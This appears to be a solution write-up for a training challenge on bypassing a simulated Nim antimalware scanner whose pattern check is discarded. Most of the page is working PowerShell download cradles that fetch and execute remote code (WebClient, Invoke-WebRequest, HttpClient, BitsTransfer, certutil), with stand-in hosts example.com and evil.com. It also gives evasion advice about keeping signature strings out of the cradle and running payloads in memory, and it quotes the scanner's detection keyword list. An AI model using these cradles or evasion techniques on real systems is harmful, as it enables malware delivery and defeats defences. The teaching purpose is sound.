---
title: "Solution 14: Download Cradle (Exploiting the Design Flaw)"
challenge_number: 14
difficulty: easy
category: "Signature Detection Bypass"
permalink: /solutions/14-download-cradle/
---

# Solution: Download Cradle (Exploiting the Design Flaw)

[Back to Challenge](../challenges/14-download-cradle.md)

## Overview

Exploit a critical design flaw in the scanner: the suspicious pattern check (`suspiciousPatternCheck`) correctly identifies download cradle patterns and returns `false` — but the scan pipeline calls it with `discard`, meaning the return value is immediately thrown away. The file passes regardless of what the check finds.

## Working Code

```powershell
# Standard WebClient download cradle
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://example.com/payload")
IEX $data
```

### Alternate Download Cradles

```powershell
# Invoke-WebRequest (PowerShell 3+)
$response = Invoke-WebRequest -Uri "http://example.com/payload" -UseBasicParsing
IEX $response.Content

# Invoke-RestMethod
$data = Invoke-RestMethod -Uri "http://example.com/payload"
IEX $data

# .NET HttpClient
$client = [System.Net.Http.HttpClient]::new()
$data = $client.GetStringAsync("http://example.com/payload").Result
IEX $data

# .NET WebRequest
$req = [System.Net.WebRequest]::Create("http://example.com/payload")
$resp = $req.GetResponse()
$reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
$data = $reader.ReadToEnd()
IEX $data

# BitsTransfer (downloads to file)
Start-BitsTransfer -Source "http://example.com/payload.ps1" -Destination "$env:TEMP\p.ps1"
& "$env:TEMP\p.ps1"

# CertUtil abuse (LOLBin)
certutil -urlcache -split -f "http://example.com/payload.exe" "$env:TEMP\payload.exe"
& "$env:TEMP\payload.exe"
```

### Combined with Signature Evasion

```powershell
# Even if the downloaded content contains "malware", the scanner
# only checks files on disk, not data in memory
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://example.com/payload")

# Data is in memory - scanner never sees it
# IEX executes directly from the string variable
IEX $data
```

## Why It Works

Looking at the actual scanner source (`nim_antimalware_sim.nim`), the suspicious pattern
check is implemented in two parts. First, a `containsSuspiciousPatterns` helper that
returns a `(bool, string)` tuple, and a `suspiciousPatternCheck` proc on the `ScanEngine`
that calls it and returns `false` when a pattern is found:

```nim
# All 22 patterns the scanner recognises (from nim_antimalware_sim.nim):
const suspiciousPatterns = [
  "invoke-expression", "iex(",           "iex ",             "downloadstring",
  "downloadfile",      "webclient",       "bitstransfer",     "start-process",
  "invoke-webrequest", "net.webclient",   "reflection.assembly",
  "frombase64string",  "encodedcommand",  "bypass",           "hidden",
  "-nop",              "-noni",           "amsiutils",        "amsiinitfailed",
  "virtualallocex",    "writeprocessmemory", "createremotethread", "shellcode"
]

proc suspiciousPatternCheck(self: ScanEngine): bool =
  log("AMSI: Checking for suspicious script patterns...")
  let (found, pattern) = containsSuspiciousPatterns(self.content)
  if found:
    log("AMSI: \e[33mWarning - Suspicious pattern detected: " & pattern & "\e[0m")
    return false   # signals detection...
  return true

# In the scan pipeline — the BUG is here, NOT inside the proc:
discard engine.suspiciousPatternCheck()  # <-- return value thrown away, never blocks
```

The `discard` keyword at the call site is what breaks enforcement. The detection
function itself works correctly — it finds the pattern and returns `false`. But
the pipeline ignores that result and continues to the next check, ultimately
returning `true` (clean) to the caller.

This is different from discarding a string literal inside the proc (which would
be a Nim compiler warning); here `discard` is intentional and silences a
meaningful boolean return value.

### What the Scanner Checks For

The 22-pattern list covers download cradles (`webclient`, `downloadstring`,
`invoke-webrequest`, `bitstransfer`), execution primitives (`iex`, `invoke-expression`,
`start-process`), .NET reflection (`reflection.assembly`, `frombase64string`),
common PowerShell evasion flags (`-nop`, `-noni`, `bypass`, `hidden`,
`encodedcommand`), AMSI internals (`amsiutils`, `amsiinitfailed`), and memory
injection indicators (`virtualallocex`, `writeprocessmemory`, `createremotethread`,
`shellcode`).

**All of these generate a warning log line — none of them block the file.**

## How to Verify

1. Save a download cradle:
   ```powershell
   @'
   $wc = New-Object System.Net.WebClient
   $data = $wc.DownloadString("http://example.com/payload")
   IEX $data
   '@ | Set-Content "test_cradle.ps1"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe test_cradle.ps1
   ```

3. Expected result: **No blocking** — the scanner logs a warning for `webclient`
   and `iex` but returns BENIGN because the `suspiciousPatternCheck` result is
   discarded.

4. Verify that signature detection still blocks independently:
   ```powershell
   # This WILL be detected (contains the literal "malware" signature)
   Set-Content "test_sig.ps1" -Value '$x = "malware"'
   nim_antimalware_sim.exe test_sig.ps1
   # → MALICIOUS

   # This will NOT be blocked (download cradle, no signature strings)
   Set-Content "test_cradle2.ps1" -Value '$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString("http://evil.com/x")'
   nim_antimalware_sim.exe test_cradle2.ps1
   # → BENIGN (discard bug)
   ```

5. The key insight: keep literal signature strings (`malware`, `virus`, etc.) out
   of the cradle. The cradle patterns themselves never block.

## Security Implications

This demonstrates why detection-without-enforcement is equivalent to no detection:
- A scanner that warns but never blocks is transparent to an attacker
- Real AV products combine static signatures, heuristics, behavioural analysis, and sandboxing
- A single `discard` at the call site negates all pattern-matching work
- Download cradles are one of the most common initial-access techniques because
  they separate the detectable indicator (the cradle script on disk) from the
  payload (downloaded into memory at runtime, never touching disk)
